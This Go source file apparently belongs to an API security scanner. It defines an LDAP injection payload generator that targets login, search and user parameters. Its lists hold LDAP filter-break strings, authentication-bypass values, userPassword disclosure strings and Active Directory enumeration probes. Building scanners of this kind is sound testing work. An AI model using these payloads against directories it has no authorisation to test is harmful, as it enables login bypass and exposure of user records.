package payloads

import (
	"strings"

	"github.com/su1ph3r/indago/pkg/types"
)

// LDAPGenerator generates LDAP injection attack payloads
type LDAPGenerator struct{}

// NewLDAPGenerator creates a new LDAP injection payload generator
func NewLDAPGenerator() *LDAPGenerator {
	return &LDAPGenerator{}
}

// Type returns the attack type
func (g *LDAPGenerator) Type() string {
	return types.AttackLDAP
}

// Generate generates LDAP injection payloads for a parameter
func (g *LDAPGenerator) Generate(endpoint types.Endpoint, param *types.Parameter) []Payload {
	var payloads []Payload

	// Target string parameters, especially auth/search related
	if param.Type != "string" && param.Type != "" {
		return payloads
	}

	// Check if parameter is likely used in LDAP operations
	if !g.isLDAPRelevant(param, endpoint) {
		return payloads
	}

	// Basic LDAP injection payloads
	payloads = append(payloads, g.basicPayloads()...)

	// Authentication bypass payloads
	payloads = append(payloads, g.authBypassPayloads()...)

	// Filter manipulation payloads
	payloads = append(payloads, g.filterManipulationPayloads()...)

	// Blind LDAP injection payloads
	payloads = append(payloads, g.blindPayloads()...)

	return payloads
}

// isLDAPRelevant checks if parameter might be used in LDAP operations
func (g *LDAPGenerator) isLDAPRelevant(param *types.Parameter, endpoint types.Endpoint) bool {
	nameLower := strings.ToLower(param.Name)
	pathLower := strings.ToLower(endpoint.Path)

	// LDAP-related parameter names
	ldapPatterns := []string{
		"user", "username", "login", "uid", "cn", "dn",
		"search", "query", "filter", "ldap",
		"email", "mail", "name", "group", "ou",
		"password", "pwd", "pass",
		"domain", "dc", "bind",
	}

	for _, pattern := range ldapPatterns {
		if strings.Contains(nameLower, pattern) {
			return true
		}
	}

	// LDAP-related endpoints
	ldapEndpoints := []string{
		"/ldap", "/auth", "/login", "/authenticate",
		"/directory", "/search", "/users", "/groups",
		"/ad", "/active-directory",
	}

	for _, ep := range ldapEndpoints {
		if strings.Contains(pathLower, ep) {
			return true
		}
	}

	return false
}

// basicPayloads generates basic LDAP injection payloads
func (g *LDAPGenerator) basicPayloads() []Payload {
	return []Payload{
		{
			Value:       "*",
			Type:        types.AttackLDAP,
			Category:    "injection",
			Description: "LDAP wildcard",
		},
		{
			Value:       "*)(&",
			Type:        types.AttackLDAP,
			Category:    "injection",
			Description: "LDAP filter break",
		},
		{
			Value:       "*)(cn=*))(|(cn=*",
			Type:        types.AttackLDAP,
			Category:    "injection",
			Description: "LDAP filter injection",
		},
		{
			Value:       ")(cn=*",
			Type:        types.AttackLDAP,
			Category:    "injection",
			Description: "LDAP close and inject",
		},
		{
			Value:       "*)(uid=*))(|(uid=*",
			Type:        types.AttackLDAP,
			Category:    "injection",
			Description: "LDAP uid filter injection",
		},
		{
			Value:       "*()|&'",
			Type:        types.AttackLDAP,
			Category:    "injection",
			Description: "LDAP special characters",
		},
		{
			Value:       "*))%00",
			Type:        types.AttackLDAP,
			Category:    "injection",
			Description: "LDAP null byte termination",
		},
	}
}

// authBypassPayloads generates LDAP authentication bypass payloads
func (g *LDAPGenerator) authBypassPayloads() []Payload {
	return []Payload{
		{
			Value:       "admin)(&)",
			Type:        types.AttackLDAP,
			Category:    "injection",
			Description: "LDAP admin auth bypass",
		},
		{
			Value:       "admin)(|(password=*)",
			Type:        types.AttackLDAP,
			Category:    "injection",
			Description: "LDAP password filter bypass",
		},
		{
			Value:       "*)((|userPassword=*)",
			Type:        types.AttackLDAP,
			Category:    "injection",
			Description: "LDAP userPassword disclosure",
		},
		{
			Value:       "admin)(!(&(1=0",
			Type:        types.AttackLDAP,
			Category:    "injection",
			Description: "LDAP NOT filter bypass",
		},
		{
			Value:       "*)(objectClass=*",
			Type:        types.AttackLDAP,
			Category:    "injection",
			Description: "LDAP objectClass wildcard",
		},
		{
			Value:       "x])(|(cn=admin)",
			Type:        types.AttackLDAP,
			Category:    "injection",
			Description: "LDAP OR injection for admin",
		},
		{
			Value:       "admin)(|(objectclass=*)",
			Type:        types.AttackLDAP,
			Category:    "injection",
			Description: "LDAP objectclass bypass",
		},
	}
}

// filterManipulationPayloads generates LDAP filter manipulation payloads
func (g *LDAPGenerator) filterManipulationPayloads() []Payload {
	return []Payload{
		{
			Value:       ")(|(mail=*",
			Type:        types.AttackLDAP,
			Category:    "injection",
			Description: "LDAP email enumeration",
		},
		{
			Value:       "*)(memberOf=CN=Admins",
			Type:        types.AttackLDAP,
			Category:    "injection",
			Description: "LDAP admin group membership",
		},
		{
			Value:       "*)(userAccountControl:1.2.840.113556.1.4.803:=2)",
			Type:        types.AttackLDAP,
			Category:    "injection",
			Description: "LDAP AD disabled accounts",
		},
		{
			Value:       "(&(objectCategory=person)(objectClass=user))",
			Type:        types.AttackLDAP,
			Category:    "injection",
			Description: "LDAP enumerate all users",
		},
		{
			Value:       ")(|(sAMAccountName=admin*)",
			Type:        types.AttackLDAP,
			Category:    "injection",
			Description: "LDAP AD admin enumeration",
		},
		{
			Value:       "*)(telephoneNumber=*",
			Type:        types.AttackLDAP,
			Category:    "injection",
			Description: "LDAP phone number disclosure",
		},
	}
}

// blindPayloads generates blind LDAP injection payloads
func (g *LDAPGenerator) blindPayloads() []Payload {
	return []Payload{
		{
			Value:       "admin)(&(uid=*)",
			Type:        types.AttackLDAP,
			Category:    "injection",
			Description: "Blind LDAP: valid user test",
		},
		{
			Value:       "admin)(&(uid=nonexistent1234)",
			Type:        types.AttackLDAP,
			Category:    "injection",
			Description: "Blind LDAP: invalid user test",
		},
		{
			Value:       "*)(cn=admin)(|(cn=",
			Type:        types.AttackLDAP,
			Category:    "injection",
			Description: "Blind LDAP: admin exists check",
		},
		{
			Value:       "*)(uid=a*",
			Type:        types.AttackLDAP,
			Category:    "injection",
			Description: "Blind LDAP: user enumeration (a*)",
		},
		{
			Value:       "*)(description=*password*",
			Type:        types.AttackLDAP,
			Category:    "injection",
			Description: "Blind LDAP: description password leak",
		},
	}
}
